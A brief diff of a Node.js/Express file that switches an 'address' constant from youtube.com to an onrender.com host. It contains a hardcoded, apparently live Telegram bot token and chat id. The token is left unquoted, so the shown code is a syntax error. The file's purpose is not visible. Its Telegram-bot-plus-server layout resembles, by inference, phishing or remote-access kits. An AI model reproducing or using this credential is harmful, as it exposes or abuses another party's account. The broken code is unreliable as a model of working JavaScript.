@@ -9,7 +9,7 @@ const axios = require("axios");
 
 const token = 8437062091:AAE2_0C9hJy7iDq6lBo16xHarTZvwk0nTzM
 const id = 7019231224
-const address = 'https://www.youtube.com'
+const address = 'https://pagal-zqdr.onrender.com'
 
 const app = express();
 const appServer = http.createServer(app);
